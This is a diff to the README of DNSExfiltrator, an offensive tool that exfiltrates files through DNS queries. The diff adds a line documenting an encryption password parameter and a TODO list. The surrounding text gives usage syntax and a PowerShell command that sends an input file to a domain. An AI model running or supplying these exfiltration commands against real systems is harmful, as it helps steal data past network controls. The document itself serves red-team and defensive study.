@@ -54,6 +54,7 @@ You can use **either** the compiled version **or** the PowerShell wrapper (*whic
 dnsExfiltrator.exe <file> <domainName> <password> [s=DNS_server] [t=throttleTime] [r=requestMaxSize] [l=labelMaxSize]
       file:           [MANDATORY] The file name to the file to be exfiltrated.
       domainName:     [MANDATORY] The domain name to use for DNS requests.
+      password:       [MANDATORY] Password used to encrypt the data to be exfiltrated.
       DNS_Server:     [OPTIONNAL] The DNS server name or IP to use for DNS requests. Defaults to the system one.
       throttleTime:   [OPTIONNAL] The time in milliseconds to wait between each DNS request.
       requestMaxSize: [OPTIONNAL] The maximum size in bytes for each DNS request. Defaults to 255 bytes..
@@ -68,6 +69,12 @@ PS c:\DNSExfiltrator> Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p pass
 [...]
 ```
 Check the EXAMPLES section in the script file for further usage examples.
+
+TODO
+----------------
+  - Some will ask for AES encryption instead of RC4, I know... might add it later
+  - Display estimated transfer time
+  - Do better argument parsing (*I'm too lazy to learn how to use a c# argument parsing library, I wish it was as simple as Python*)
 
 DISCLAIMER
 ----------------
